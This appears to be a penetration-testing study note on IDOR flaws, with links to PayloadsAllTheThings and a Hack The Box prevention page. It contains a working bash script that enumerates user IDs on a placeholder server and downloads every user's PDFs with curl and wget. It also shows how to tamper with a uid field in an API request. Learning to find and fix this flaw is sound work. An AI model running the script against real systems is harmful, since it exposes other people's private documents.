## IDOR - Insecure Direct Object References

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References

Basic use case : 

```bash
download.php?file_id=123
```

Script example to get all file when IDOR is identified
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

API use case : 
```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "foo": "bar",
    "foo": "bar"
}
```
We can change the value of the “uid” parameter.
We can also play with HTTP methods to potentially obtain other responses.

## IDOR Prevention
https://academy.hackthebox.com/module/134/section/1202